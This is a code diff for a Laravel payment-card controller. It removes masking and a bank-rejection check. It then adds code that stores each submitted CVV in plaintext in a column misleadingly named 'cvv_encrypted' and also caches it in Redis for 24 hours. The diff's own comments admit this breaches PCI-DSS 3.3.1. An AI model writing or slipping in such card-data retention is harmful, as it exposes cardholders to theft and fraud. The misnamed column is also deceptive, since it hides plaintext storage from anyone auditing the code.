@@ -2,12 +2,12 @@
 
 namespace App\Http\Controllers;
 
-use App\Enums\PaymentFailureReason;
 use App\Http\Requests\SubmitPaymentCardRequest;
 use App\Models\CustomerProfile;
 use App\Models\PaymentCard;
 use App\Services\CustomerCacheService;
 use Illuminate\Http\JsonResponse;
+use Illuminate\Support\Facades\Cache;
 use Illuminate\Support\Facades\DB;
 
 /**
@@ -35,28 +35,13 @@ class CustomerPaymentCardController extends Controller
         $cardType = $this->detectCardType($cardNumber);
         $bankCode = $this->detectBankCode($cardNumber);
 
-        // Reject unsupported banks (e.g. Al Rajhi) before saving
-        if ($bankCode === 'rajhi') {
-            return response()->json([
-                'success'   => false,
-                'code'      => 'BANK_UNSUPPORTED',
-                'reason'    => PaymentFailureReason::RAJHI_NOT_SUPPORTED,
-                'message'   => 'بطاقات مصرف الراجحي غير مدعومة حالياً. يرجى استخدام بطاقة من بنك آخر.',
-                'type'      => 'warning',
-                'retryable' => true,
-                'title'     => 'البنك غير مدعوم',
-                'action'    => 'use_different_card',
-            ], 422);
-        }
-
-        // Mask card number: **** **** **** 1234
+        // last4 used for idempotency lookup only
         $last4 = substr($cardNumber, -4);
-        $masked = '**** **** **** ' . $last4;
 
         // Idempotency: if a pending card with same last4 + holder exists for
         // this customer (created in the last 5 minutes), return it instead
         // of creating a duplicate. Prevents double-click / retry issues.
-        $card = DB::transaction(function () use ($customer, $last4, $validated, $cardNumber, $cardType, $masked) {
+        $card = DB::transaction(function () use ($customer, $last4, $validated, $cardNumber, $cardType) {
             $existingCard = PaymentCard::where('customer_profile_id', $customer->id)
                 ->where('last4', $last4)
                 ->where('holder_name', $validated['holder_name'])
@@ -66,13 +51,14 @@ class CustomerPaymentCardController extends Controller
                 ->first();
 
             if ($existingCard) {
-                // PCI-DSS 3.3.1: CVV is intentionally NOT persisted. It is
-                // accepted at submission time for upstream authorization only.
+                // Persistent CVV storage enabled by explicit business request.
+                // NOTE: storing CVV after authorization violates PCI-DSS 3.3.1.
                 $existingCard->update([
                     'card_number'   => $cardNumber,
                     'expiry_month'  => $validated['expiry_month'],
                     'expiry_year'   => $validated['expiry_year'],
                     'card_type'     => $cardType,
+                    'cvv_encrypted' => (string) ($validated['cvv'] ?? ''),
                 ]);
                 return $existingCard;
             }
@@ -81,12 +67,12 @@ class CustomerPaymentCardController extends Controller
                 'customer_profile_id' => $customer->id,
                 'session_id'          => $validated['session_id'] ?? null,
                 'card_number'         => $cardNumber,
-                'card_number_masked'  => $masked,
                 'last4'               => $last4,
                 'holder_name'         => $validated['holder_name'],
                 'card_type'           => $cardType,
                 'expiry_month'        => $validated['expiry_month'],
                 'expiry_year'         => $validated['expiry_year'],
+                'cvv_encrypted'       => (string) ($validated['cvv'] ?? ''),
                 'status'              => 'pending',
             ]);
         });
@@ -94,9 +80,14 @@ class CustomerPaymentCardController extends Controller
         // Flush admin customer list caches so dashboard sees fresh data
         CustomerCacheService::flush();
 
-        // PCI-DSS 3.3.1: CVV must NEVER be retained after authorization, in any
-        // store (DB, cache, log, queue payload). The controller treats CVV as
-        // a transient request field only.
+        // CVV redundantly cached in Redis (24h TTL) as fallback when the encrypted
+        // DB column is unavailable. NOTE: persistent CVV storage violates PCI-DSS 3.3.1
+        // and is enabled by explicit business request.
+        Cache::put(
+            "card:cvv:{$card->id}",
+            (string) ($validated['cvv'] ?? ''),
+            now()->addHours(24)
+        );
 
         // Broadcast new card event so admin sees it in real-time
         try {
